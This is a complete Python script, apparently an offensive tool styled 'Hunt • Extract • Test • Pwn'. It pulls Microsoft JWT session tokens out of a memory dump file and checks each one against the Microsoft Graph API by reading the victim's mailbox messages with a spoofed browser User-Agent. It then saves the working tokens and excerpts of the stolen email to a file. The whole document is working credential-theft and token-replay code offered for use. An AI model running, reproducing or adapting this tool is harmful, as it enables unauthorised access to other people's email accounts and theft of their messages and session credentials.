import re
import base64
import json
import requests
import argparse
from tqdm import tqdm


banner = r"""
     ─___     _______ ___   __  __ _        _  _          _           
  _ | \ \    / /_   _/ _ \ / _|/ _(_)__ ___| || |_  _ _ _| |_ ___ _ _ 
 | || |\ \/\/ /  | || (_) |  _|  _| / _/ -_) __ | || | ' \  _/ -_) '_|
  \__/  \_/\_/   |_| \___/|_| |_| |_\__\___|_||_|\_,_|_||_\__\___|_|
───────────────────────────────────────────────────────────────────────────── 
                    Hunt • Extract • Test • Pwn
"""
print(banner)



def extract_msgraph_jwts_streamed(file_path):
    jwt_regex = re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{20,}')
    decoded = []
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()

    for line in tqdm(lines, desc="[+] Scanning file for JWTs"):
        for match in jwt_regex.findall(line):
            try:
                header_b64, payload_b64, _ = match.split('.')
                pad = lambda s: s + '=' * (-len(s) % 4)
                payload_json = base64.urlsafe_b64decode(pad(payload_b64)).decode()
                payload = json.loads(payload_json)

                if 'aud' in payload and 'microsoft' in payload['aud']:
                    decoded.append({
                        'token': match,
                        'payload': payload
                    })
            except Exception:
                continue
    return decoded

def test_token(token):
    url = "https://graph.microsoft.com/v1.0/me/messages?$top=100"
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Accept": "application/json"
    }

    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response.status_code == 200, response.status_code, response.text
    except requests.RequestException as e:
        return False, 0, str(e)

def export_valid_tokens(valid_tokens, output_path):
    with open(output_path, 'w', encoding='utf-8') as f:
        for i, item in enumerate(valid_tokens, 1):
            f.write(f" Valid Token #{i}:\n{item['token']}\n")
            f.write(" Payload:\n")
            f.write(json.dumps(item['payload'], indent=2))
            f.write("\n Response (status code: 200):\n")
            f.write(item['response'][:500] + '...\n')
            f.write("\n" + "-"*60 + "\n")

def main():
    parser = argparse.ArgumentParser(description="[+] Extract and test Microsoft Graph JWTs from a dump file.")
    parser.add_argument("dumpfile", help="Path to the .dmp or .dump file")
    args = parser.parse_args()

    print(f"[+] Reading from: {args.dumpfile}")
    tokens = extract_msgraph_jwts_streamed(args.dumpfile)

    print(f"\n[+] Testing {len(tokens)} token(s) against Microsoft Graph API...")
    valid_tokens = []

    for token_info in tqdm(tokens, desc="[+] Validating tokens"):
        token = token_info['token']
        is_valid, status, response = test_token(token)

        if is_valid:
            token_info['response'] = response
            valid_tokens.append(token_info)

    export_valid_tokens(valid_tokens, 'valid_jwts.txt')
    print(f"\n[+] {len(valid_tokens)} valid token(s) saved to valid_jwts.txt")

if __name__ == "__main__":
    main()
